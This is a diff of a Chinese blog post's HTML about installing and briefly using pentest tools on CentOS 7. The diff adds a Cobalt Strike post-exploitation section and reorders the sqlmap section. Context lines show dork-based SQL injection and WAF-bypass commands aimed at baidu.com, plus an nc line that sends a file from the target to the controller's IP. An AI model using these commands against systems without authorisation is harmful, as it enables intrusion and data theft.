@@ -99,11 +99,13 @@
 <meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/dirsearch.png">
 <meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/xsstrike.png">
 <meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/cmseek.png">
-<meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/snith.png">
+<meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/snitch.png">
 <meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/sqliv.png">
 <meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/wafinja.png">
 <meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/wfuzz.png">
-<meta property="og:updated_time" content="2019-03-14T17:53:43.350Z">
+<meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/c1.png">
+<meta property="og:image" content="https://enul1ttle.github.io/2019/03/14/Centos7渗透工具自动化安装/cs2.png">
+<meta property="og:updated_time" content="2019-03-14T18:59:05.790Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Centos7渗透工具自动化安装">
 <meta name="twitter:description" content="工具地址：https://github.com/Enul1ttle/Centos7PTA 0x01 安装内容 必备组件：net-tools wget bzip texlive alien guntls-utils git pip httpd zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel">
@@ -372,7 +374,7 @@
 <li>漏洞扫描：Nilto openvas Arachni w3af dirsearch XSStrike CMSeek sqliv</li>
 <li>漏洞利用 :metasploit sqlmap</li>
 <li>模糊测试：WAFNinja Wfuzz</li>
-<li>后渗透工具：nc frp</li>
+<li>后渗透工具：nc frp cobaltstrike</li>
 </ul>
 <h2 id="0x02-工具的介绍与简单使用"><a href="#0x02-工具的介绍与简单使用" class="headerlink" title="0x02 工具的介绍与简单使用"></a>0x02 工具的介绍与简单使用</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><ul>
 <li><code>whois 域名</code></li>
@@ -434,12 +436,13 @@
 <blockquote>
 <p><code>snitch -D ext -U baidu.com -P15</code></p>
 </blockquote>
-<p><img src="snith.png" alt></p>
+<p><img src="snitch.png" alt></p>
 <h3 id="sqliv"><a href="#sqliv" class="headerlink" title="sqliv"></a>sqliv</h3><p>配合谷歌黑客语法对子域名多的目标进行初步SQL检测是个不错的选择</p>
 <blockquote>
 <p><code>sqliv -d &quot;site:baidu.com inurl:?id=&quot; -e google</code></p>
 </blockquote>
 <p><img src="sqliv.png" alt></p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap中文手册：<a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/" target="_blank" rel="noopener">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/</a></p>
 <h3 id="WAFNinja"><a href="#WAFNinja" class="headerlink" title="WAFNinja"></a>WAFNinja</h3><p>灵活的WAF自动化Fuzz工具</p>
 <blockquote>
 <p><code>wafinja bypass -u &quot;http://www.target.com/index.php&quot;  -p &quot;Name=PAYLOAD&amp;Submit=Submit&quot; 
@@ -477,7 +480,14 @@
 <p>控制机：<code>nc -l 6666 &gt;1.txt</code><br>靶机：<code>nc 控制端IP 6666 &lt; c:\1.txt</code></p>
 </blockquote>
 <h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p>micropoor：<a href="https://micro8.gitbook.io/micro8/contents" target="_blank" rel="noopener">https://micro8.gitbook.io/micro8/contents</a></p>
-<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap中文手册：<a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/" target="_blank" rel="noopener">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/</a></p>
+<h3 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h3><p>后渗透神器，很方便很舒服，谁用谁知道。</p>
+<blockquote>
+<p><code>cs 服务器IP password</code></p>
+</blockquote>
+<p><img src="c1.png" alt></p>
+<blockquote>
+<p>操作机：<code>java -jar cobaltstrike.jar</code><br><img src="cs2.png" alt></p>
+</blockquote>
 
       
     </div>
@@ -633,7 +643,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-安装内容"><span class="nav-number">1.</span> <span class="nav-text">0x01 安装内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-工具的介绍与简单使用"><span class="nav-number">2.</span> <span class="nav-text">0x02 工具的介绍与简单使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#whois"><span class="nav-number">2.1.</span> <span class="nav-text">whois</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wafw00f"><span class="nav-number">2.2.</span> <span class="nav-text">wafw00f</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#whatweb"><span class="nav-number">2.3.</span> <span class="nav-text">whatweb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">2.4.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GitMiner"><span class="nav-number">2.5.</span> <span class="nav-text">GitMiner</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ReconDog"><span class="nav-number">2.6.</span> <span class="nav-text">ReconDog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subDomainsBrute"><span class="nav-number">2.7.</span> <span class="nav-text">subDomainsBrute</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sublist3r"><span class="nav-number">2.8.</span> <span class="nav-text">Sublist3r</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nikto"><span class="nav-number">2.9.</span> <span class="nav-text">Nikto</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arachni"><span class="nav-number">2.10.</span> <span class="nav-text">Arachni</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#w3af"><span class="nav-number">2.11.</span> <span class="nav-text">w3af</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#openvas"><span class="nav-number">2.12.</span> <span class="nav-text">openvas</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dirsearch"><span class="nav-number">2.13.</span> <span class="nav-text">dirsearch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSStrike"><span class="nav-number">2.14.</span> <span class="nav-text">XSStrike</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CMSeek"><span class="nav-number">2.15.</span> <span class="nav-text">CMSeek</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#snitch"><span class="nav-number">2.16.</span> <span class="nav-text">snitch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqliv"><span class="nav-number">2.17.</span> <span class="nav-text">sqliv</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAFNinja"><span class="nav-number">2.18.</span> <span class="nav-text">WAFNinja</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wfuzz"><span class="nav-number">2.19.</span> <span class="nav-text">Wfuzz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frp"><span class="nav-number">2.20.</span> <span class="nav-text">frp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">2.21.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#metasploit"><span class="nav-number">2.22.</span> <span class="nav-text">metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.23.</span> <span class="nav-text">sqlmap</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-安装内容"><span class="nav-number">1.</span> <span class="nav-text">0x01 安装内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-工具的介绍与简单使用"><span class="nav-number">2.</span> <span class="nav-text">0x02 工具的介绍与简单使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#whois"><span class="nav-number">2.1.</span> <span class="nav-text">whois</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wafw00f"><span class="nav-number">2.2.</span> <span class="nav-text">wafw00f</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#whatweb"><span class="nav-number">2.3.</span> <span class="nav-text">whatweb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">2.4.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GitMiner"><span class="nav-number">2.5.</span> <span class="nav-text">GitMiner</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ReconDog"><span class="nav-number">2.6.</span> <span class="nav-text">ReconDog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subDomainsBrute"><span class="nav-number">2.7.</span> <span class="nav-text">subDomainsBrute</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sublist3r"><span class="nav-number">2.8.</span> <span class="nav-text">Sublist3r</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nikto"><span class="nav-number">2.9.</span> <span class="nav-text">Nikto</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arachni"><span class="nav-number">2.10.</span> <span class="nav-text">Arachni</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#w3af"><span class="nav-number">2.11.</span> <span class="nav-text">w3af</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#openvas"><span class="nav-number">2.12.</span> <span class="nav-text">openvas</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dirsearch"><span class="nav-number">2.13.</span> <span class="nav-text">dirsearch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSStrike"><span class="nav-number">2.14.</span> <span class="nav-text">XSStrike</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CMSeek"><span class="nav-number">2.15.</span> <span class="nav-text">CMSeek</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#snitch"><span class="nav-number">2.16.</span> <span class="nav-text">snitch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqliv"><span class="nav-number">2.17.</span> <span class="nav-text">sqliv</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.18.</span> <span class="nav-text">sqlmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAFNinja"><span class="nav-number">2.19.</span> <span class="nav-text">WAFNinja</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wfuzz"><span class="nav-number">2.20.</span> <span class="nav-text">Wfuzz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frp"><span class="nav-number">2.21.</span> <span class="nav-text">frp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc"><span class="nav-number">2.22.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#metasploit"><span class="nav-number">2.23.</span> <span class="nav-text">metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cobaltstrike"><span class="nav-number">2.24.</span> <span class="nav-text">cobaltstrike</span></a></li></ol></li></ol></div>
             
 
           </div>
